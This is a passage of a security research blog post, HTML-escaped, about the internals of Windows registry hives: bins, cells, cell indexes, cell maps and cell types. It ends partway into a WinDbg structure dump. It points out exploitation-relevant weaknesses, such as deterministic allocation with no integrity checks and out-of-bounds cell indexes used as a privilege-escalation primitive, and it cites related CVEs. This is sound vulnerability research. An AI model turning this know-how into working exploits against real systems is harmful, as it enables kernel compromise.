 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x01c&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Spare&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;br/&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The four meaningful fields here are the four-byte signature (&amp;quot;hbin&amp;quot;), offset of the bin in the file, size of the bin, and a timestamp. Among them, the signature is a constant, the file size is sanitized early in the hive process and effectively also a constant, and the timestamp is not security-relevant. This leaves us with the size as the most interesting part of the header. The only constraints for it is that it must be a multiple of 0x1000, and the sum of the offset and size must not exceed the total length of the hive (_HBASE_BLOCK.Length). At runtime, bins are allocated as the smallest 4 KiB-aligned regions that fit a cell of the requested size, so in practice, they typically end up being between 4-16 KiB in size, but they may organically be as long as 1 MiB. While longer bins cannot be produced by the Windows kernel, there is nothing preventing a specially crafted hive from being loaded in the system with a bin of ~2 GiB in size, the maximum length of a hive as a whole. This behavior doesn&amp;#39;t seem to have any direct security implications, but more generally, it is a great example of how the hive states written by Windows are a strictly smaller subset of the set of states accepted as valid during loading:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgYqh3EsSpb1OQE4B1Z9wJu72kGwf9ucWfyBv7Ydmo3lvQcR9-IGjcLYjeCl4AcC_8Ng9gsCCXKs6gtDparNcaqGlDfuZqkS5OEpkAWqhCwwPpTTLcCi5oi-BsBnzHGAzh_Q4pkzjCrauCEHvz9y1f-6KVaFdVZyp_D58CZIVy8ZL13Uv5LRj7Jytc_qao/s720/image14.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgYqh3EsSpb1OQE4B1Z9wJu72kGwf9ucWfyBv7Ydmo3lvQcR9-IGjcLYjeCl4AcC_8Ng9gsCCXKs6gtDparNcaqGlDfuZqkS5OEpkAWqhCwwPpTTLcCi5oi-BsBnzHGAzh_Q4pkzjCrauCEHvz9y1f-6KVaFdVZyp_D58CZIVy8ZL13Uv5LRj7Jytc_qao/s720/image14.png&quot; border=&quot;0&quot; alt=&quot;Image showing that the states written by the kernel are a subset of states accepted by the hive loader&quot; style=&quot;max-height: 750px; max-width: 600px;&quot; width=&quot;50%&quot; title=&quot;Image showing that the states written by the kernel are a subset of states accepted by the hive loader&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;h3 class=&quot;MvcjwGOuIU-c57 MvcjwGOuIU-c12&quot; id=&quot;h.yfgt6zsua46j&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c54 MvcjwGOuIU-c17&quot;&gt;Cells&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Cells are the smallest unit of data in registry hives &amp;ndash; they&amp;#39;re continuous buffers of arbitrary lengths. They do not have a dedicated header structure like _HBASE_BLOCK or _HBIN, but instead, each cell simply consists of a signed 32-bit size marker followed by the cell&amp;#39;s data. The size field is subject to the following constraints:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_w06aeeqvjm56-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;A cell may be in one of two states &amp;ndash; allocated and free &amp;ndash; as indicated by the sign of the size value. Positive values are used for free cells, and negative ones for allocated cells.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The size value accounts for the four bytes occupied by itself.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The size value must be a multiple of 8 (i.e. have its three lowest bits set to zero). If a cell with size non-divisible by 8 is allocated at runtime, it is aligned up to the next multiple of 8, potentially leading to some unused padding bytes at the end of the cell.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c12 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The sum of all consecutive cells in a bin must be equal to the length of the bin. In other words, the bin header followed by tightly packed cells (with no gaps) completely fill the bin space. If the hive loader detects that this is not the case, it forcefully fixes it by creating a single free cell spanning from the failing point up to the end of the bin. This invariant must subsequently hold for the entire time the hive is loaded in the system.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;If cells remind you of heap allocations requested via malloc or HeapAlloc, it is not just your impression. There are many parallels to be drawn between hive cells and heap buffers: both can be allocated and freed, have arbitrary sizes and store a mixture of well-formatted structures and free-form user data. However, there are some significant differences too: heap implementations have evolved to include anti-exploitation mitigations like layout randomization, heap cookies for metadata protection, double-free detection and miscellaneous other consistency checks. On the other hand, hives have none of that: the allocation logic is fully deterministic and doesn&amp;#39;t involve any randomness, there is no metadata protection, and generally little to no runtime checks. This is likely caused by the fact that heap chunks have been targets of memory corruption for many decades, whereas the registry was designed with the assumption that once loaded, the hive structure is always internally consistent and intra-hive memory corruption may never occur. This makes the exploitation of certain registry bugs particularly convenient and reliable, as I will demonstrate in future blog posts.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;Like a typical memory allocator interface, cells have &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;alloc&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;realloc&lt;/span&gt;&lt;span&gt;, and &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;free&lt;/span&gt;&lt;span&gt;&amp;nbsp;functions. Specifically, the internal routines responsible for these tasks in the Windows kernel are &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;HvAllocateCell&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;HvReallocateCell &lt;/span&gt;&lt;span&gt;and &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;HvFreeCell&lt;/span&gt;&lt;span&gt;, and reverse-engineering them allowed me to uncover some helpful insights. For instance, I have found that HvAllocateCell and HvReallocateCell reject allocation sizes larger than 1 MiB, and for requests above 16 KiB, they round the size up to the next power of two. Meanwhile, HvFreeCell performs coalescing of free cells, so there should never be two adjacent free cells in an organically created hive. These are some further examples of behavior that is guaranteed &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;on output&lt;/span&gt;&lt;span&gt;, but not enforced &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;on input&lt;/span&gt;&lt;span&gt;. This is a prevalent pattern in the Windows registry, and I found it useful to keep track of such primitives in my research, even if they didn&amp;#39;t seem particularly useful at the time. Thanks to this, I have discovered at least three security bugs closely related to this phenomenon, including one in the interactions between HvReallocateCell and its callers (&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451463&quot;&gt;CVE-2022-37988&lt;/a&gt;&lt;/span&gt;&lt;span&gt;).&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;MvcjwGOuIU-c57 MvcjwGOuIU-c12&quot; id=&quot;h.reg0gy58lqpa&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c54 MvcjwGOuIU-c17&quot;&gt;Cell indexes&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;If we equate cells to heap buffers in user-mode applications, then cell indexes would be pointers. Cells rely on these indexes to interrelate within the registry&amp;#39;s complex structure. For example, keys reference security descriptors (to control access), their parent key (to navigate the hierarchy), and optionally the list of subkeys and list of values (to organize data). The list of values references specific value records, which in turn reference the actual data backing cells, and so on. This intricate web of relationships is no different from any semi-complex object in a C/C++ program, where pointers link various data structures.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;On disk, cell indexes are nothing special: they are simply 32-bit offsets from the start of the hive data (after the 0x1000 byte header), which is a typical way of implementing cross-object references in most file formats. However, it&amp;#39;s important to note that a cell index must point to the beginning of a cell (not inside it or in the bin header), and the cell must be in the allocated state &amp;ndash; otherwise, the index is considered invalid. So when implementing a read-only regf parser operating on the hive as a contiguous memory block, translating cell indexes is as simple as adding them to the starting address of the hive in memory.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;When a hive is loaded in Windows, the management of cell indexes becomes more complex. Hives at rest have a maximum size of 2 GiB, and all of their data is considered stable (persistently stored). On the other hand, an active hive also gains an additional 2 GiB of volatile storage, used for temporary keys and values that reside only in memory. These temporary entries exist only while the hive is loaded (or until the system is shut down) and can be created by calling &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexw&quot;&gt;RegCreateKeyEx&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;with the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexw%23reg_option_volatile&quot;&gt;REG_OPTION_VOLATILE&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag, which designates the key as temporary. To distinguish between these two storage spaces in a cell index, the highest bit serves as an indicator: 0x0 for stable space and 0x1 for the volatile one, resulting in large index values (greater than 0x80000000) that readily identify volatile cells.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;But an even bigger complication stems from the fact that hives can shrink and grow at runtime, so it is largely impractical to have them mapped as a single block of memory. To efficiently handle modifications to the registry, Windows maps hives in smaller chunks, which makes the previous method of translating cell indexes obsolete, and necessitates a more sophisticated solution. The answer to the problem are &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;cell maps&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;ndash; pagetable-like structures that divide the 32-bit hive address space into smaller, nested layers, indexed by the respective 1, 10, 9, and 12-bit parts of the 32-bit cell index. Cell maps in the Windows kernel utilize a hierarchical structure consisting of storage arrays, directories, tables, and leaf entries, all defined within the ntoskrnl.exe PDB symbols (the relevant structures are _DUAL, _HMAP_DIRECTORY, _HMAP_TABLE and _HMAP_ENTRY). The layout of cell indexes and cell maps is illustrated in the diagram below, based on a similar diagram in the Windows Internals book, which itself draws from Mark Russinovich&amp;#39;s 1999 article, &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/previous-versions//cc750583(v%3Dtechnet.10)&quot;&gt;Inside the Registry&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgCnLfjamN3weVknLoBRSdhrrgxg4incqp0IIvqzjmymKwz39z3wptwKxQYyEpW8Lj15493Nx9sdrcZype51AqDczO8_RJWZEgHNRKoWSA7CXuN70U8_SHvieNxsPbuf6k2L_z10A17wPTxcqr7TqLfAzHfmtKNgEuTRkeiJT_2NPuw5DD6DVWvw_TbSNg/s1999/image11.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgCnLfjamN3weVknLoBRSdhrrgxg4incqp0IIvqzjmymKwz39z3wptwKxQYyEpW8Lj15493Nx9sdrcZype51AqDczO8_RJWZEgHNRKoWSA7CXuN70U8_SHvieNxsPbuf6k2L_z10A17wPTxcqr7TqLfAzHfmtKNgEuTRkeiJT_2NPuw5DD6DVWvw_TbSNg/s1200/image11.png&quot; border=&quot;0&quot; alt=&quot;Cell Index Image&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Cell Index Image&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;Cell indexes play a central role in core registry operations, such as creating, reading, updating, and deleting keys and values. The internal kernel function responsible for traversing the cell map and translating cell indexes into virtual addresses is &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;HvpGetCellPaged&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;. In normal conditions, the indexes stay within the bounds of the storage space size (_HHIVE.Storage[x].Length), so HvpGetCellPaged assumes their validity and doesn&amp;#39;t perform any additional bounds checking. However, certain memory corruption vulnerabilities may allow attackers to manipulate these cell indexes at runtime. Crucially, I discovered that out-of-bounds cell indexes can serve as a powerful primitive for exploit development, enabling the construction of proof-of-concept exploits that achieve local elevation of privileges. I will elaborate further on this in future exploit-focused blog posts.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;As a last note, the special marker of -1 (0xFFFFFFFF) is used to represent non-existent cells, and can be found in cell indexes pointing at optional data that doesn&amp;#39;t exist &amp;ndash; basically a hive equivalent of a NULL pointer. The internal name for the constant in the Windows kernel is HCELL_NIL, and under normal circumstances, it should never be passed directly to HvpGetCellPaged. Doing so without guaranteeing that the cell index is valid first would constitute a bug in the Windows kernel (for example, see &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451589&quot;&gt;CVE-2023-35357&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451590&quot;&gt;CVE-2023-35358&lt;/a&gt;&lt;/span&gt;&lt;span&gt;).&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;MvcjwGOuIU-c12 MvcjwGOuIU-c70&quot; id=&quot;h.gwhjtxntum31&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c40&quot;&gt;Cell types&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;Now that we have familiarized ourselves with the low-level structure of hives that facilitates their efficient management in memory, let&amp;#39;s go a little further and learn about the types of information stored &lt;/span&gt;&lt;span&gt;in&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;the cells. These are the objects that actually define the registry tree and all of its properties: keys, values, security descriptors, etc. The first subsection provides a general overview of the various cell types found within a hive and the relations between them. The second one goes into the intricate details of their format and usage within the Windows kernel, uncovering obscure implementation details rarely documented elsewhere.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;MvcjwGOuIU-c57 MvcjwGOuIU-c12&quot; id=&quot;h.u8pc9eopt3no&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c54 MvcjwGOuIU-c17&quot;&gt;Overview of cell types&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Registry hives utilize only seven distinct cell types to represent the various data structures within the registry, as outlined below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_9i4egiire8k6-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Key Node:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;Represents a single registry key and its associated metadata. It is defined by the _CM_KEY_NODE structure and contains references to other cells, including its parent key, security descriptor, class data (optional), and lists of subkeys (stable and volatile) and values (optional).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Subkey Index:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;A variable-length list of key node cell indexes, representing the subkeys of a specific key. For performance reasons, there are four variations of subkey indexes: index leaf, fast leaf, hash leaf, and root index. All are represented by the _CM_KEY_INDEX structure.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Security Descriptor:&lt;/span&gt;&lt;span&gt;&amp;nbsp;Defines access control information for one or more keys, specifically a security descriptor in a self-relative format. Represented by the &lt;/span&gt;&lt;span&gt;_CM_KEY_SECURITY&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure, it is the only cell type that can be referenced from multiple key nodes and is therefore reference-counted. It also contains links to the next and previous security descriptors in the hive.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Key Value:&lt;/span&gt;&lt;span&gt;&amp;nbsp;Defines a single value associated with a key, including its name, type, data length, and a reference to the cell &lt;/span&gt;&lt;span&gt;containing the actual data. It is represented by the _CM_KEY_VALUE structure.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Big Data:&lt;/span&gt;&lt;span&gt;&amp;nbsp;Used to store value data exceeding 16,344 bytes (~16 KiB) in hive versions 1.4 and later. The data is divided into chunks of up to 16 KiB each, allowing for values approaching 1 GiB. Th&lt;/span&gt;&lt;span&gt;e _CM_BIG_DATA structure represents this cell type, containing the number of chunks and a reference to the list of chunk cells.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Value List and Chunk List Cells:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;These cells are simple arrays of 32-bit cell indexes. They are used to store lists of values associated with a key and lists of chunks for large value data.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Data Cells:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;These cells store the raw data associated with keys and values. They hold the optional class data for a key, the complete data for small values (up to 1 MiB in older hives, ~16 KiB in newer hives), and the individual chunks of large values.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The diagram below illustrates the relationships between these cell types:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9sBOCJ5Wjme99GVbzbKzraCQRVqsJmcNVPeiPTJcQ4N_PipfueQfUEsb3Sfswy0BnxXQuM9iWvq4cjc0A28rJR_Jv5XJ9g99Yszsd8zATyoszpsfWwFCV127-5eNmYAO3V5Atj_pMul6xIMwk6Cm_t6dka6Uyq3xNmCkNa4ok7laVo8kdNXUEE4w_rJc/s1999/image6.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9sBOCJ5Wjme99GVbzbKzraCQRVqsJmcNVPeiPTJcQ4N_PipfueQfUEsb3Sfswy0BnxXQuM9iWvq4cjc0A28rJR_Jv5XJ9g99Yszsd8zATyoszpsfWwFCV127-5eNmYAO3V5Atj_pMul6xIMwk6Cm_t6dka6Uyq3xNmCkNa4ok7laVo8kdNXUEE4w_rJc/s1200/image6.png&quot; border=&quot;0&quot; alt=&quot;Diagram illustrating the relationships between these cell types&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Diagram illustrating the relationships between these cell types&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;MvcjwGOuIU-c12 MvcjwGOuIU-c57&quot; id=&quot;h.9ct0kf63yhfw&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c17 MvcjwGOuIU-c54&quot;&gt;Deep dive into each cell type&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Now that we know the general purpose of each cell type, it&amp;#39;s a good time to dig a little deeper into each of them. This lets us explore both their implementation details, as well as the spirit behind these objects and how they interact with each other in a real-life environment. I have tried my best to avoid repeating the existing unofficial specifications and instead only focus on the security-relevant and sparsely documented aspects of the format, but if any redundant information makes it into this section, please bear with me. &amp;#128578;&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;MvcjwGOuIU-c12 MvcjwGOuIU-c18&quot; id=&quot;h.91eb799dfqpv&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c17 MvcjwGOuIU-c19&quot;&gt;Key nodes&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;As keys are the most important part of the registry, key nodes are the most important and complex of all cell types. When dumped in WinDbg, the layout of the _CM_KEY_NODE structure is as follows:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;dt&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_CM_KEY_NODE&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;/r&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;nt!_CM_KEY_NODE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x000&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Signature&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint2B&lt;/span&gt;&lt;/p&gt;
